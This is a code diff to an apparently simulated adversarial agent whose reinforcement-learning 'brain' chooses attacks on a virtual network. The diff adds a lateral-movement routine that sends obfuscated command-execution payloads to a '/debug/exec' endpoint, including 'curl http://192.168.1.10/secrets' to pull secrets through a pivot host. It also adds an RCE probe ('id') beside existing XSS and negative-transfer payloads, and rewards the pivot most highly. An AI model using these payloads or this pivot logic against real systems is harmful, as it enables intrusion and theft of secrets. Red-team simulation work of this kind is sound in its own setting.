@@ -46,7 +46,7 @@ class RedMeshNode:
         }
 
         # RL Brain (Adversarial)
-        self.brain = utils.RLBrain(f"RedNode-{NODE_ID}", ["POLYMORPH", "STEGO", "FLOOD_C2", "FUZZ_BLUE", "NET_EXPLOIT"])
+        self.brain = utils.RLBrain(f"RedNode-{NODE_ID}", ["POLYMORPH", "STEGO", "FLOOD_C2", "FUZZ_BLUE", "NET_EXPLOIT", "LATERAL_MOVE"])
 
         # Virtual Network
         self.nic = VNic(f"10.0.{random.randint(20,200)}.{random.randint(2,254)}")
@@ -136,6 +136,31 @@ class RedMeshNode:
         logger.info(f"🔄 Re-connected with new Identity: {new_ip}")
         self.block_count = 0
 
+    def lateral_move(self):
+        """Exploit RCE to pivot to internal network."""
+        target = "10.10.10.10"
+
+        # 1. Recon Internal
+        recon_payload = {
+            "method": "POST",
+            "path": "/debug/exec",
+            "data": {"cmd": "ping internal"}
+        }
+
+        # 2. Exfiltrate Core Data via Pivot
+        pivot_payload = {
+            "method": "POST",
+            "path": "/debug/exec",
+            "data": {"cmd": "curl http://192.168.1.10/secrets"}
+        }
+
+        logger.info("🕷️ LATERAL MOVEMENT: Pivoting via 10.10.10.10 -> 192.168.1.10")
+
+        # Polymorph the payloads
+        self.nic.send(target, polymorph_payload(recon_payload))
+        time.sleep(0.5)
+        self.nic.send(target, polymorph_payload(pivot_payload))
+
     def net_exploit(self):
         """Launch attacks via VNet."""
         # Fast Flux: Rotate Identity frequently
@@ -159,7 +184,9 @@ class RedMeshNode:
             # XSS
             {"path": "/search_user", "data": {"q": "<script>alert(1)</script>"}, "desc": "Reflected XSS"},
             # Business Logic
-            {"path": "/transfer", "data": {"amount": "-500"}, "desc": "Negative Transfer"}
+            {"path": "/transfer", "data": {"amount": "-500"}, "desc": "Negative Transfer"},
+            # RCE
+            {"path": "/debug/exec", "data": {"cmd": "id"}, "desc": "RCE Probe"}
         ]
 
         attack = random.choice(attacks)
@@ -498,6 +525,9 @@ Restart=always
             elif action == "NET_EXPLOIT":
                 self.net_exploit()
                 reward = 15
+            elif action == "LATERAL_MOVE":
+                self.lateral_move()
+                reward = 50 # Jackpot
 
             # Check survival (Simplistic reward)
             reward += 1
